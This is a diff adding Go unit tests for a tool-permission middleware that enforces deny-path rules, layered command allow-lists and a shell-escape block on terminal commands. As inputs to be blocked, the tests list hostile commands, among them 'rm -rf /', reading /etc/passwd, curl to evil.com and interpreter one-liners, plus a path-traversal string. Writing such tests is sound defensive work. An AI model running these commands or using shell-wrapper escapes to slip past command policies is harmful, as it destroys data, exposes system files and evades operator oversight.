@@ -189,20 +189,26 @@ func TestEnforceWithPaths_nonStringPathArgSkipped(t *testing.T) {
 	}
 }
 
-func TestEnforceWithPaths_invalidPatternSkipped(t *testing.T) {
-	// A syntactically invalid glob pattern must not crash; it is silently skipped.
+func TestEnforceWithPaths_pathTraversalCleaned(t *testing.T) {
+	// A path with ".." components must be cleaned before pattern matching so
+	// that traversal sequences cannot bypass a deny_paths rule.
+	// e.g. /workspace/secrets/../../etc/passwd resolves to /etc/passwd and
+	// should NOT match **/secrets/**, but a pattern like **/etc/** should match.
 	cfg := cfgWith("read_readFile", config.ToolPolicy{
 		Allowed:   allowBool(true),
-		DenyPaths: []string{"[invalid"}, // unclosed bracket → bad pattern
+		DenyPaths: []string{"**/etc/**"},
 	})
 	mw := policy.EnforceWithPaths(cfg, "read_readFile", "path")
 
-	result, err := apply(mw, makeReq(map[string]any{"path": "/workspace/main.go"}))
+	// Without cleaning, "/workspace/secrets/../../etc/passwd" would not match
+	// "**/secrets/**". With cleaning it becomes "/etc/passwd" which matches
+	// "**/etc/**" — confirming the traversal is resolved before matching.
+	result, err := apply(mw, makeReq(map[string]any{"path": "/workspace/secrets/../../etc/passwd"}))
 	if err != nil {
 		t.Fatalf("unexpected error: %v", err)
 	}
-	if result.IsError {
-		t.Error("IsError = true, want false (invalid pattern skipped)")
+	if !result.IsError {
+		t.Error("IsError = false, want true (path traversal must be caught after cleaning)")
 	}
 }
 
@@ -337,6 +343,43 @@ func TestEnforceWithCommand_toolDenied(t *testing.T) {
 	}
 }
 
+func TestEnforceWithCommand_allowLayersLogicalIntersection(t *testing.T) {
+	// Simulate two config layers loaded via config.Load:
+	//   Layer 0 (user config):    ["go *", "git *"]
+	//   Layer 1 (project config): ["go *", "npm *"]
+	// A command must satisfy BOTH layers (logical AND), not just one.
+	// This means "git status" is denied (fails layer 1) and "npm install" is
+	// denied (fails layer 0), even though each would pass one layer individually.
+	cfg := cfgWith("execute_runInTerminal", config.ToolPolicy{
+		Allowed: allowBool(true),
+		AllowCommandLayers: [][]string{
+			{"go *", "git *"},
+			{"go *", "npm *"},
+		},
+	})
+	mw := policy.EnforceWithCommand(cfg, "execute_runInTerminal", "command")
+
+	cases := []struct {
+		cmd     string
+		wantErr bool
+		reason  string
+	}{
+		{"go test ./...", false, "matches both layers"},
+		{"git status", true, "matches layer 0 but not layer 1"},
+		{"npm install", true, "matches layer 1 but not layer 0"},
+		{"make build", true, "matches neither layer"},
+	}
+	for _, tc := range cases {
+		result, err := apply(mw, makeReq(map[string]any{"command": tc.cmd}))
+		if err != nil {
+			t.Fatalf("cmd %q: unexpected error: %v", tc.cmd, err)
+		}
+		if result.IsError != tc.wantErr {
+			t.Errorf("cmd %q (%s): IsError = %v, want %v", tc.cmd, tc.reason, result.IsError, tc.wantErr)
+		}
+	}
+}
+
 // --- EnforceWithURL ---
 
 func TestEnforceWithURL_noDenyURLs_passes(t *testing.T) {
@@ -404,5 +447,106 @@ func TestEnforceWithURL_toolDenied(t *testing.T) {
 	}
 	if !result.IsError {
 		t.Error("IsError = false, want true (tool denied)")
+	}
+}
+
+// --- EnforceWithCommand (deny_shell_escape) ---
+
+// TestEnforceWithCommand_denyShellEscape_blocksShellWrappers verifies that
+// deny_shell_escape blocks common -c/-e interpreter invocations that would
+// otherwise bypass deny_commands glob patterns.
+func TestEnforceWithCommand_denyShellEscape_blocksShellWrappers(t *testing.T) {
+	cfg := cfgWith("execute_runInTerminal", config.ToolPolicy{
+		Allowed:         allowBool(true),
+		DenyShellEscape: true,
+	})
+	mw := policy.EnforceWithCommand(cfg, "execute_runInTerminal", "command")
+
+	wantBlocked := []string{
+		"bash -c 'rm -rf /'",
+		"sh -c 'cat /etc/passwd'",
+		"zsh -c 'curl https://evil.com'",
+		"python -c 'import os; os.system(\"id\")'",
+		"python3 -c '__import__(\"os\").system(\"id\")'",
+		"perl -e 'system(\"id\")'",
+		"node -e 'require(\"child_process\").exec(\"id\")'",
+		"node --eval 'process.exit(1)'",
+		"ruby -e 'exec(\"id\")'",
+	}
+	for _, cmd := range wantBlocked {
+		result, err := apply(mw, makeReq(map[string]any{"command": cmd}))
+		if err != nil {
+			t.Fatalf("cmd %q: unexpected error: %v", cmd, err)
+		}
+		if !result.IsError {
+			t.Errorf("cmd %q: IsError = false, want true (shell escape blocked)", cmd)
+		}
+	}
+
+	// Normal commands should still pass.
+	wantAllowed := []string{
+		"go test ./...",
+		"make build",
+		"python manage.py migrate",
+		"bash setup.sh",
+	}
+	for _, cmd := range wantAllowed {
+		result, err := apply(mw, makeReq(map[string]any{"command": cmd}))
+		if err != nil {
+			t.Fatalf("cmd %q: unexpected error: %v", cmd, err)
+		}
+		if result.IsError {
+			t.Errorf("cmd %q: IsError = true, want false (not a shell escape)", cmd)
+		}
+	}
+}
+
+// TestEnforceWithCommand_denyShellEscape_disabledHasNoEffect verifies that
+// when deny_shell_escape is false (the default), shell-like commands are not
+// additionally blocked.
+func TestEnforceWithCommand_denyShellEscape_disabledHasNoEffect(t *testing.T) {
+	cfg := cfgWith("execute_runInTerminal", config.ToolPolicy{
+		Allowed:         allowBool(true),
+		DenyShellEscape: false,
+	})
+	mw := policy.EnforceWithCommand(cfg, "execute_runInTerminal", "command")
+
+	result, err := apply(mw, makeReq(map[string]any{"command": "bash -c 'echo hello'"}))
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	// With deny_shell_escape disabled, the command should pass (no deny_commands set either).
+	if result.IsError {
+		t.Error("IsError = true, want false (deny_shell_escape is disabled)")
+	}
+}
+
+// TestEnforceWithCommand_denyShellEscape_runsAfterAllowList verifies that a
+// command that passes allow_commands is still blocked by deny_shell_escape.
+func TestEnforceWithCommand_denyShellEscape_runsAfterAllowList(t *testing.T) {
+	cfg := cfgWith("execute_runInTerminal", config.ToolPolicy{
+		Allowed:         allowBool(true),
+		AllowCommands:   []string{"bash *"},
+		DenyShellEscape: true,
+	})
+	mw := policy.EnforceWithCommand(cfg, "execute_runInTerminal", "command")
+
+	// "bash -c '...'' matches allow_commands ("bash *") but must still be
+	// blocked by deny_shell_escape.
+	result, err := apply(mw, makeReq(map[string]any{"command": "bash -c 'rm -rf /'"}))
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if !result.IsError {
+		t.Error("IsError = false, want true (deny_shell_escape overrides allow_commands)")
+	}
+
+	// Plain "bash setup.sh" passes both allow_commands and deny_shell_escape.
+	result, err = apply(mw, makeReq(map[string]any{"command": "bash setup.sh"}))
+	if err != nil {
+		t.Fatalf("unexpected error: %v", err)
+	}
+	if result.IsError {
+		t.Error("IsError = true, want false (bash without -c is not a shell escape)")
 	}
 }
